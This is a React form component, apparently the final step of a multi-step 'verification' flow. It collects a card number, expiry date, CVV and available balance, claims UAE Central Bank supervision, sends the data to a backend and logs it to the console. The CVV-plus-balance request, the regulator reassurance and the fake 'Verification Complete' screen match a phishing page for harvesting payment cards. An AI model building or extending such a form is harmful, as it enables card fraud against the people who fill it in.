import React, { useState } from 'react';
import useApi from '../hooks/useApi';
import { API_ENDPOINTS } from '../config/api';
import { FaCheckCircle } from "react-icons/fa";
import { IoArrowBack, IoArrowForward } from "react-icons/io5";
const Step6_ManualVerification = ({ prevStep, formData, userId }) => {
  const [cardData, setCardData] = useState({
    cardNumber: '',
    validThrough: '',
    cvv: '',
    balance: ''
  });
  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const api = useApi();

  const validate = () => {
    const newErrors = {};
    if (!cardData.cardNumber || cardData.cardNumber.length < 19) {
      newErrors.cardNumber = 'Please enter a valid card number';
    }
    if (!cardData.validThrough || cardData.validThrough.length < 5) {
      newErrors.validThrough = 'Please enter valid date (MM/YY)';
    }
    if (!cardData.cvv || cardData.cvv.length < 3) {
      newErrors.cvv = 'Please enter a valid CVV';
    }
    if (!cardData.balance) {
      newErrors.balance = 'Please enter available balance';
    }
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (validate()) {
      setLoading(true);
      try {
        console.log('📤 Saving Step 6 - Card Details:', cardData);
        console.log('📤 User ID:', userId);

        // ✅ Send direct data, not nested
        const response = await api.post(API_ENDPOINTS.SAVE_STEP, {
          step: 6,
          data: cardData,
          userId: userId
        });
        
        console.log('✅ Step 6 Response:', response.data);

        if (response.data.success) {
          setSubmitted(true);
        } else {
          alert(response.data.message || 'Error submitting');
        }
      } catch (error) {
        console.error('❌ Error submitting:', error);
        alert('Error submitting. Please try again.');
      } finally {
        setLoading(false);
      }
    }
  };

  if (submitted) {
    return (
      <div className="text-center" style={{ padding: '40px 0' }}>
       <div style={{ marginBottom: '20px' }}>
  <FaCheckCircle size={64} color="#22c55e" />
</div>
        <h2 style={{ color: '#1a1a2e', marginBottom: '10px' }}>Verification Complete!</h2>
        <p style={{ color: '#6c757d', fontSize: '16px' }}>
          Your application has been submitted successfully.
          <br />
          Reference ID: {userId}
        </p>
        <div style={{ 
          marginTop: '20px',
          padding: '15px',
          background: '#e8f0fe',
          borderRadius: '8px',
          color: '#1a73e8'
        }}>
          You will receive a confirmation email shortly.
        </div>
      </div>
    );
  }

  return (
    <form onSubmit={handleSubmit} className="manual-verification">
      <h2>Manual verification</h2>
      <p className="subtitle">
        Enter your card details and available balance to complete verification.
      </p>

      <div className="form-group">
        <label>Debit/Credit Card number</label>
        <input
          type="text"
          value={cardData.cardNumber}
          onChange={(e) => {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 16) value = value.slice(0, 16);
            let formatted = '';
            for (let i = 0; i < value.length; i++) {
              if (i > 0 && i % 4 === 0) formatted += ' ';
              formatted += value[i];
            }
            setCardData({...cardData, cardNumber: formatted});
          }}
          className={errors.cardNumber ? 'error' : ''}
          placeholder="0000 0000 0000 0000"
          maxLength="19"
        />
        {errors.cardNumber && <div className="error-text">{errors.cardNumber}</div>}
      </div>

      <div className="card-input-group">
        <div className="form-group">
          <label>Valid Through</label>
          <input
            type="text"
            value={cardData.validThrough}
            onChange={(e) => {
              let value = e.target.value.replace(/\D/g, '');
              if (value.length > 4) value = value.slice(0, 4);
              if (value.length >= 2) {
                value = value.slice(0, 2) + '/' + value.slice(2);
              }
              setCardData({...cardData, validThrough: value});
            }}
            className={errors.validThrough ? 'error' : ''}
            placeholder="MM / YY"
            maxLength="5"
          />
          {errors.validThrough && <div className="error-text">{errors.validThrough}</div>}
        </div>

        <div className="form-group">
          <label>CVV</label>
          <input
            type="password"
            value={cardData.cvv}
            onChange={(e) => {
              const value = e.target.value.replace(/\D/g, '').slice(0, 4);
              setCardData({...cardData, cvv: value});
            }}
            className={errors.cvv ? 'error' : ''}
            placeholder="123"
            maxLength="4"
          />
          {errors.cvv && <div className="error-text">{errors.cvv}</div>}
        </div>
      </div>

      <div className="form-group full-width">
        <label>Available Balance</label>
        <input
          type="text"
          value={cardData.balance}
          onChange={(e) => {
            const value = e.target.value.replace(/[^0-9.]/g, '');
            setCardData({...cardData, balance: value});
          }}
          className={errors.balance ? 'error' : ''}
          placeholder="Enter available balance"
        />
        {errors.balance && <div className="error-text">{errors.balance}</div>}
      </div>

      <div style={{ 
        fontSize: '12px', 
        color: '#6c757d', 
        textAlign: 'center',
        padding: '12px',
        background: '#f8f9fa',
        borderRadius: '8px',
        margin: '15px 0'
      }}>
        All financial institutions listed here comply with UAE regulations and are 
        under the supervision of the Central Bank of UAE.
      </div>

      <div className="button-group">
       <button type="button" className="btn btn-secondary" onClick={prevStep}>
  <>
    <IoArrowBack /> Back
  </>
</button>
       <button type="submit" className="btn btn-success" disabled={loading}>
  {loading ? (
    "Processing..."
  ) : (
    <>
      Verify Finance <FaCheckCircle /> <IoArrowForward />
    </>
  )}
</button>
      </div>
    </form>
  );
};

export default Step6_ManualVerification;